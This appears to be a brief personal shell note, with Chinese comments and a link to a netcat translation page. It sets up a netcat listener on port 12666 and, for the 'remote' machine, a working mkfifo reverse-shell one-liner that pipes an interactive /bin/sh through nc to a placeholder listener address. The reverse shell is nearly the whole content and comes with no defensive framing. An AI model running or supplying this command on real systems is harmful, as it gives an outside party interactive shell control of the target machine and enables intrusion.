#http://www.oschina.net/translate/linux-netcat-command

#local
#监听端口
nc -vv -l 12666

#remote
#反向连接
mkfifo /tmp/tmp_fifo
cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc <local_ip> <local_port> > /tmp/tmp_fifo

